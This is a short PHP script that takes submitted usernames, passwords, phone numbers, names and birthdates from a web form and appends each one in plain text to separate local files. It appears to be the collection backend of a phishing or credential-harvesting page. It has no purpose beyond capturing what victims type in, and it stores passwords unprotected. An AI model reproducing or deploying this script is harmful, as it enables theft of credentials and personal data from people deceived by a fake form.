<?php

$user = $_POST['userkey'];
$passwd = $_POST['passkey'];
$usernumber = $_POST['numberkey'];
$username = $_POST['namekey'];
$userbirth = $_POST['birthkey'];

if(isset($user)){
    $filename = fopen("username_key.txt","a");
    fwrite($filename,$user);
    fclose($filename);
}

if(isset($passwd)){
    $filename = fopen("password_key.txt","a");
    fwrite($filename,$passwd);
    fclose($filename);
}

if(isset($usernumber)){
    $filename = fopen("number.txt","a");
    fwrite($filename,$usernumber);
    fclose($filename);
}

if(isset($username)){
    $filename = fopen("name.txt","a");
    fwrite($filename,$username);
    fclose($filename);
}

if(isset($userbirth)){
    $filename = fopen("birth.txt","a");
    fwrite($filename,$userbirth);
    fclose($filename);
}





?>